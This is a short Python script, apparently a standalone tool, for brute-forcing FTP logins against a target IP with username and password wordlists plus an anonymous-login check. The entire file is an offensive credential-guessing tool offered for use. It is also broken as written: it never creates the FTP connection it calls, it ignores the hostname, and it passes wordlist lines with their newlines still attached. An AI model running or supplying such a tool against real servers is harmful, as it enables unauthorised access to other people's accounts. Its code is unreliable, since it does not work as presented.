import ftplib
import argparse
import colorama
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

def ftp_login(username, password):
	try:
		ftp.login(username, password)
		print(f"[+] {Fore.GREEN}Found{Fore.RESET}: {username}:{password}")

	except:
		print(f"[-] {Fore.RED}Failed{Fore.RESET}: {username}:{password}")

def brute_login(hostname, user, userlist, password, passwordlist):
	try:
		if user != None and password != None:
			ftp_login(user, password)

		elif user != None and passwordlist != None:
			with open(passwordlist) as file:
				passwords = file.readlines()

			for passwd in passwords:
				ftp_login(user, passwd)

		elif userlist != None and password != None:
			with open(userlist) as file:
				users = file.readlines()

			for usr in users:
				ftp_login(usr, password)

		elif userlist != None and passwordlist != None:
			with open(userlist) as file1:
				users = file1.readlines()

			with open(passwordlist) as file2:
				passwords = file2.readlines()

			for usr in users:
				for passwd in passwords:
					ftp_login(usr, passwd)

	except Exception as e:
		print(f'[!] {Fore.YELLOW}Error{Fore.RESET}: ', e)

parser = argparse.ArgumentParser(description='FTP Brute Force')
parser.add_argument('-u', required=False, type=str, help='Single user')
parser.add_argument('-U', required=False, type=str, help='User list')
parser.add_argument('-p', required=False, type=str, help='Single password')
parser.add_argument('-P', required=False, type=str, help='Password list')
parser.add_argument('-t', required=True, type=str, help='Target IP')
parser.add_argument('-a', required=False, action='store_true', help='Anon Login')
args = parser.parse_args()

brute_login(args.t, args.u, args.U, args.p, args.P)

if args.a:
	ftp_login('anonymous', 'anonymous')
